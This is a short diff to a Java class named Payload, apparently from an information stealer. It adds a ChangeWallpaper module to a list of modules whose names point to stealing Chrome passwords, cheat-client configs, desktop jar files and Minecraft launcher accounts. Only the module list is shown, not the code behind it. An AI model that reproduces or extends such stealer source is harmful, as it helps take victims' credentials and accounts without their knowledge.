@@ -29,6 +29,7 @@ public final class Payload {
                 new ChromePassword(),
                 new NixwareConfigs(),
                 new JarsFromDesktop(),
+                new ChangeWallpaper(),
                 new LegendwareScripts(),
                 new MCLauncherAccounts()
         ));
